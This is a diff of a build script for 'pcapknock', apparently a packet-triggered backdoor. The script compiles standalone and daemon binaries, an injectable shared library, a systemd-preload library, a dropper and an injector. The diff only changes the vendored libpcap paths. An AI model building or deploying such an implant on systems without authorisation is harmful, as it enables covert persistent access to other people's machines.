@@ -23,21 +23,21 @@ if [ ! -d "$OUTDIR" ]; then mkdir -p $OUTDIR; fi
 
 # Linux
 if [ "Linux" = "$(uname -s)" ]; then
-        PCAPDIR=./libpcap-1.9.0/built #Vendored libpcap
+        PCAPDIR=./libpcap-1.9.0 #Vendored libpcap
         INJDIR=./linux_injector
         DROPPER=$OUTDIR/systemd_dropper.sh
         DROPPERLIB="/usr/local/lib/libpk.so.4"
 
         # Build a standalone binary for debugging
-        cc $COPTS -DDEBUG                         -I$PCAPDIR/include -o "$OUTDIR/pcapknock.standalone.debug"  *.c $PCAPDIR/lib/libpcap.a -lpthread
+        cc $COPTS -DDEBUG                         -I$PCAPDIR -o "$OUTDIR/pcapknock.standalone.debug"  *.c $PCAPDIR/libpcap.a -lpthread
         # Build a standalone non-daemonizing binary
-        cc $COPTS                                 -I$PCAPDIR/include -o "$OUTDIR/pcapknock.standalone"        *.c $PCAPDIR/lib/libpcap.a -lpthread
+        cc $COPTS                                 -I$PCAPDIR -o "$OUTDIR/pcapknock.standalone"        *.c $PCAPDIR/libpcap.a -lpthread
         # Build a standalone daemonizing binary
-        cc $COPTS -DDAEMON                        -I$PCAPDIR/include -o "$OUTDIR/pcapknock.standalone.daemon" *.c $PCAPDIR/lib/libpcap.a -lpthread
+        cc $COPTS -DDAEMON                        -I$PCAPDIR -o "$OUTDIR/pcapknock.standalone.daemon" *.c $PCAPDIR/libpcap.a -lpthread
         # Build an injectable library
-        cc $COPTS -DCONSTRUCTOR                   -I$PCAPDIR/include -o "$OUTDIR/pcapknock.so"                *.c $PCAPDIR/lib/libpcap.a -lpthread -fPIC -shared -fvisibility=hidden
+        cc $COPTS -DCONSTRUCTOR                   -I$PCAPDIR -o "$OUTDIR/pcapknock.so"                *.c $PCAPDIR/libpcap.a -lpthread -fPIC -shared -fvisibility=hidden
         # Build an preloadable systemd-only library
-        cc $COPTS -DCONSTRUCTOR -DPRELOAD_SYSTEMD -I$PCAPDIR/include -o "$OUTDIR/pcapknock.systemd.so"       *.c $PCAPDIR/lib/libpcap.a -lpthread -ldl -fPIC -shared -Wl,--version-script=systemd.version
+        cc $COPTS -DCONSTRUCTOR -DPRELOAD_SYSTEMD -I$PCAPDIR -o "$OUTDIR/pcapknock.systemd.so"        *.c $PCAPDIR/libpcap.a -lpthread -ldl -fPIC -shared -Wl,--version-script=systemd.version
         # Build an injector
         (cd $OUTDIR; xxd -i pcapknock.so) > $INJDIR/pcapknock.so.c
         cc -DDEBUG $COPTS -I$INJDIR -o $OUTDIR/pcapknock.injector $INJDIR/*.c -static
